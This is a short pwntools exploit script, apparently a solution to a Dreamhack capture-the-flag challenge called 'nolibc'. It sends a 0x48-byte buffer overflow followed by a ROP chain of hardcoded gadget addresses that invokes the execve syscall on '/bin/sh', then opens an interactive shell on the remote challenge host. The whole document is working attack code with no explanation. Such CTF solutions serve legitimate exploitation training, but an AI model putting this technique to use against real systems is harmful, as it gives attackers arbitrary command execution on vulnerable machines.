from pwn import *

binary = "./nolibc"
# p = process(binary)
p = remote("host8.dreamhack.games", 10130)
e = ELF(binary)

pop_rax_pop_rdi = 0x0000000000401071 # pop rax ; pop rdi ; ret
pop_rsi_pop_rdx = 0x000000000040107f # pop rsi ; pop rdx ; ret
binsh = 0x0000000000402000
syscall = 0x0000000000401028 # syscall

payload = b"A" * 0x48

payload += p64(pop_rax_pop_rdi) + p64(0x3b) + p64(binsh)
payload += p64(pop_rsi_pop_rdx) + p64(0) + p64(0)
payload += p64(syscall)

p.send(payload)
p.interactive()